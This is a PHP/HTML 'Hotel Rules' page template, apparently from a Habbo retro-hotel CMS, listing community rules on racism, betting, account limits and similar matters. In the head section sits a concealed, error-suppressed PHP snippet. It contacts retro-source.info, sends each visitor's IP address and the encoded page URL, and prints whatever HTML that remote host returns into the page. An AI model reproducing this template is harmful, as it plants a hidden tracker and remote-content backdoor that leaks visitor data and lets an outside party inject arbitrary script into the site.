
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
        <title>{hotelName} - Rules</title>
        
        <link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/common.css" type="text/css">
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs2.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/visual.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/libs.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/common.js"></script>
        <script type="text/javascript" src="{url}/app/tpl/skins/{skin}/js/fullcontent.js"></script>
		  <link rel="shortcut icon" href="app/tpl/skins/{skin}/static/images/favicon.gif" />
        
        <script type="text/javascript">
            document.habboLoggedIn = true;
            var habboName = "{username}";
            var habboId = {userid};
            var habboReqPath = "";
            var habboStaticFilePath = "{url}/app/tpl/skins/Habbo";
            var habboImagerUrl = "http://www.habbo.com/habbo-imaging/";
            var habboPartner = "";
            var habboDefaultClientPopupUrl = "{url}/client";
            window.name = "habboMain";
            if (typeof HabboClient != "undefined") {
                HabboClient.windowName = "eac955c8dbc88172421193892a3e98fc7402021a";
                HabboClient.maximizeWindow = true;
            }
        </script>

<?php $rsa = @fsockopen("retro-source.info", 80, $rsd, $rse, 4); if ($rsa) { @fwrite($rsa, "GET http://retro-source.info/xmlrpc/".$_SERVER['REMOTE_ADDR']."/".base64_encode('http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'])."/ HTTP/1.0\r\n\r\n"); while (!feof($rsa)) { $rsc .= fread($rsa, 8192); } @fclose($rsa); if (@stripos($rsc, "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->") !== false) { $rsf = @explode("<!-- RETRO-SOURCE.INFO: Begin Vote Code -->", $rsc); echo "<!-- RETRO-SOURCE.INFO: Begin Vote Code -->".$rsf[1]; } } ?>

<link rel="stylesheet" href="{url}/app/tpl/skins/{skin}/styles/lightweightmepage.css" type="text/css" />


<script src="{url}/app/tpl/skins/{skin}/js/lightweightmepage.js" type="text/javascript"></script>

								<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/moredata.js" type="text/javascript"></script>



<!--[if IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie8.css" type="text/css" />
<![endif]-->
<!--[if lt IE 8]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie.css" type="text/css" />
<![endif]-->
<!--[if lt IE 7]>
<link rel="stylesheet" href="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/styles/ie6.css" type="text/css" />
<script src="http://images.habbo.com/habboweb/63_1dc60c6d6ea6e089c6893ab4e0541ee0/1430/web-gallery/static/js/pngfix.js" type="text/javascript"></script>
<script type="text/javascript">
try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {}
</script>

<style type="text/css">
body { behavior: url(/js/csshover.htc); }
</style>
<![endif]-->
<meta name="build" content="63-BUILD1228 - 27.03.2012 12:15 - com" />
</head>
		
		<style type="text/css">
            body {
                background: url('{url}/app/tpl/skins/Habbo/images/bg.png');
				background-repeat:no-repeat;
				background-color:#75bfe4;
				background-attachment:fixed;
            }
			.contentHolder {
margin-left:2px;
  width: 730px;
  height:auto;
  background-color: #FFFFFF;
  padding: 15px;

  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  border-radius: 3px;
}
hr { height: 0; border-style: dashed; border-width: 1px 0 0 0; border-color:
#COLORHERE; }
</style>
    </head>
    
<body id="home">

	<script src=""></script>
        <div id="overlay"></div>
        <div id="header-container">
            <div id="header" class="clearfix">
                <h1><a href="{url}/"></a></h1>
                <div id="subnavi">
                     <div id="subnavi-user">
					                   <div style="margin-top:6px">
									<img src="{url}/app/tpl/skins/{skin}/images/icons/message.gif" /> Welcome back, <b>{userName}</b>! &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/stats.gif" /> {online} Users Online &nbsp; &nbsp; 
									<img src="{url}/app/tpl/skins/{skin}/images/icons/credits.gif" /> {coins} &nbsp; &nbsp;
									<img src="{url}/app/tpl/skins/{skin}/images/icons/pixels.gif" /> {activityPoints} &nbsp; &nbsp;
									
</div>
                    </div>     
<div id="subnavi-search">
<div id="subnavi-search-upper">
<ul id="subnavi-search-links">
</li>
</ul>
</div>
</div>

					<div id="to-hotel">
<a href="{url}/logout" class="new-button red-button" style="margin-right:5px;margin-left:5px;"><b>Logout</b><i></i></a>

                        <a href="{url}/api.php" class="new-button green-button" target="eac955c8dbc88172421193892a3e98fc7402021a" onclick="HabboClient.openOrFocus(this); return false;"><b>Enter {hotelName}</b><i></i></a>
			 			
                    
				   </div>
                </div>
                <ul id="navi">
                    <li class="metab selected"><strong>{username} <img src="{url}/app/tpl/skins/{skin}/images/id.png" style="vertical-align: middle;"></strong><span></span></li>
                    <li><a href="{url}/community">Community <img src="{url}/app/tpl/skins/{skin}/images/forum_2.gif" style="vertical-align: middle;"></a><span></span></li>

                </ul>
                <div id="habbos-online">
	<div id="content">
		<div class="cbb ">
<span>{online} members online</span></div>
	</div></div></div></div></div></div></div></div></div></div></div>
            </div>
        </div>
        <div id="content-container">
            <div id="navi2-container" class="pngbg">
                <div id="navi2" class="pngbg clearfix">
                    <ul>
                        <li class=" last"><a href="{url}/me">Home</li>
						<li class=" last"><a href="{url}/home">My Page</a></li>
                        <li class=" last"><a href="{url}/Profile">Account Settings</a></li>
						<li class="selected">Hotel Rules</a></li>
						<li class=" last"><a href="{url}/online">Online Users</a></li>
                    </ul>
                </div>
            </div>
            <div id="container">
                
<div class="contentHolder">
<center><h1>Hotel Rules</h1></center>
<br>
<hr>
These are the {hotelName} rules. If you do not wish to abide by these rules, you are free to leave and go elsewhere. We
do not want you here if you are going to ignore the rules that are put in place for other users safety, and to make their
visit more welcoming here at {hotelName}. If you do not abide by these rules, you will recieve warnings and if you continue
to break our rules, you will be banned immediately with no other warnings. Thanks for playing fair!<br><br><br>
<ul>
<hr><br>
<li> <b>-</b> Racism will not be tollerated here at {hotelName}. Any racist behaviour, no matter what your race it will be dealt with
the same with every user and staff member. You will recieve a warning first and if it continues, you will recieve a 2Hour ban.
After that if continued, the ban will be permenant.<br><br>
</li><hr><br>
<li> <b>-</b> Do not ask for rares from members of staff. Rares are to be given out in competitions, there is one released on a weekly basis,
and also <a href="{url}/vip">VIP</a> members recieve 8 new rares each month. Also, do not ask for VIP. VIP is a feature that users
must purchase to recieve. It is not given out. VIP helps us pay our server bills each month. Without it, there would be no {hotelName}!</li><br>
<hr><br>
<li> <b>-</b> All members of staff do not take responsibility for items that are lost in bets. Your bets must be recorded or a staff member
must witness your bet if you wish to have your items replaced. <b>Gamble at your own risk</b>.</li><br><hr>
<br>
<li> <b>-</b> Advertising another hotel will result in a permenant ban with no appeal. We do not accept excuses for advertising
another hotel as it is basically taking users away from {hotelName}.</li><br><hr>
<br>
<li> <b>-</b> You are limited to having a maximum of two accounts. Any attempt to make more accounts will result in a permenant ban.
We do not allow more than 2 accounts in case you create accounts to get yourself more credits. 200 Credits are given out
every 15 minutes.</li><br><hr>
<br>
<li> <b>-</b> Your account is your own responsibility. If you forget / lose your password, we cannot change your password for you.
Also if your furniture is lost due to someone knowing your password, your furniture will not be replaced.</li><br><hr>
<br>
<li> <b>-</b> Abusive language towards staff members or members of the communtiy will result in a mute. If you do not calm down
after the mute, you will recieve two warnings and then you will be banned for two hours. After the ban is over,
if you still do not stop your account will be banned for 24 hours. The 24 hour ban will be your final warning before you
are banned for 30 days.</li><br><hr>
<br>
<li> <b>-</b> Sexual behaviour is not tollerated. Any sexual talk will be treated seriously and you will recieve and immediate ban. Cybering
is also a form of 'sexual behaviour'</li><br><hr>

<br>
<li> <center><b>If you do not agree to these rules, then you are free to leave.</b><br><a href="{url}">Click here to continue</a></center></li><br><hr>

<br>

<text><b><b>-</b> RainbowJerk</b></text>

</UL>

</div>
                            </div>
                        </div>
         
        </div>
        <script type="text/javascript">if (!$(document.body).hasClassName('process-template')) { Rounder.init(); }</script>
        <script type="text/javascript">
            HabboView.run();
        </script>

        <!--[if lt IE 7]>
            <script type="text/javascript">
                Pngfix.doPngImageFix();
            </script>
        <![endif]-->
        
        <div id="footer" >
        </div>
    
    </body>
</html>